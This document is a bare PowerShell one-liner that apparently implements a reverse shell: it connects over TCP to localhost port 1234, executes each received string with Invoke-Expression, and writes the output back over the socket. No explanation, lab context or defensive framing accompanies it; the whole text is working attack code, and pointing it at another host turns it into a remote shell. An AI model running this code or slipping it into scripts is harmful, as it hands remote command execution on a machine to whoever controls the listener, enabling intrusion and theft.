$client=New-Object Net.Sockets.TCPClient("localhost",1234);$stream=$client.GetStream();$writer=New-Object IO.StreamWriter($stream);$buffer=New-Object byte[] 1024;while(($bytes=$stream.Read($buffer,0,$buffer.Length)) -ne 0){$data=([Text.Encoding]::ASCII.GetString($buffer,0,$bytes)).Trim();$sendback=if($data){try{Invoke-Expression $data 2>&1|Out-String}catch{"Error: $_"}}else{"[+] No output"};$writer.WriteLine($sendback.Trim());$writer.Flush()};$client.Close()